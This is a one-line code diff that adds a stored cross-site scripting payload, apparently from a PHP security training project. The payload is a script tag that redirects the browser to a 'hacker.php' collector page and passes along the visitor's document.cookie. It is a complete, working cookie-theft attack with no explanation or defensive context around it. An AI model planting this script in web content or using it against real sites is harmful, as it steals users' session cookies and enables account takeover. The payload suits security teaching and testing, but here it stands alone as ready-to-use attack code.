@@ -1,0 +1,1 @@
+<script> location.href = 'http://localhost/training-php/hacker.php?cookie='+document.cookie </script>
